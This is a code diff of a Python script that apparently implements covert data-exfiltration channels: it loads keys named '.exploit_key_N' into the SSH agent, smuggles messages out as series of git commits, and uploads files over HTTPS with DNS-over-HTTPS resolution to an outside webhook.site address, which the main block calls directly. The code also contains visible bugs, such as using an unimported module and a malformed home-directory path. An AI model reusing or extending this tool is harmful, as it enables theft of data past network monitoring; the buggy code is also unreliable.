@@ -1,8 +1,10 @@
 from cryptography.fernet import Fernet
-from os import listdir
+from os import listdir, path, mkdir
 import subprocess
 
-DNS_RESOLVER="https://dns.google/dns-query"
+import testnetwork
+
+DNS_RESOLVER="https://cloudflare-dns.com/dns-query"
 
 SERVER="127.0.0.1:5000"
 PUB_KEY="id_rsa.pub"
@@ -28,11 +30,15 @@ def fetch_keys(server_name):
 
 def init_git_keys():
 	""" Takes the key files and saves it to the ssh agent """
-	keynames = listdir("~/.ssh")
+	try:
+		os.mkdir(path.expanduser("~")+".ssh")
+	except:
+		print("Exists")
+	keynames = listdir(path.expanduser("~")+"/.ssh")
 	index=1
 	while (".exploit_key_%d"%index) in keynames or  (".exploit_key_%d.pub"%index) in keynames:
 		index+=1
-	subprocess.run(["bash","load_key.sh",(".exploit_key_%d"%index)])
+	subprocess.run(["bash","load_key.sh",(".exploit_key_%d"%index),"./keys"])
 
 def send_commit_message(msg):
 	""" Break up a message and send it as a series of commits. """
@@ -67,25 +73,32 @@ def send_https_file(file, dest, resolver):
 
 def send(body, is_file=False):
 	""" Based on network conditions and msg size, choose an appropriate way to transmit a message """
-	#subprocess.run(["python3", "testnetwork.py"]) 
+	response = -1
+	try:
+		subprocess.run(["python3", "testnetwork.py"]).returncode
+	except:
+		pass
 
-	if False:
+	if response == -1 or not is_file:
 		send_commit_message(body)
-	elif False:
-		send_git_file()
-	elif False:
-		send_https_file()
-	pass
+	elif response == 1:
+		send_https_file(body)
+	else:
+		send_git_file(body)
+	
 
 def recv(remote_url):
 	""" Based on network conditions and msg size, choose an appropriate way to send the file """
-	if False:
-		get_https_file()
-	pass
+	if remote_url is not None:
+		get_https_file(remote_url)
+	else:
+		get_commit_message()
 
 if __name__=="__main__":
-	fetch_keys(SERVER)
-	send_git_file("test.json")
-	send_https_file("test.json","https://webhook.site/ff3193e4-77b4-42c7-8787-afb64168e494")	
-	send_commit_message("Test")
-	recv(None)
+	#fetch_keys(SERVER)#these two lines get keys from server, decrypt with symmetric key and save to user agent
+	#init_git_keys()
+        #these are all just commands for sending and receiving data
+	send_git_file("test.json")#upload file to git
+	send_https_file("test.json","https://webhook.site/ff3193e4-77b4-42c7-8787-afb64168e494")	#upload file using https (with doh)
+	send_commit_message("Test") # upload message using commit
+	recv(None)# pull the commit log and save to file called "commitlog"
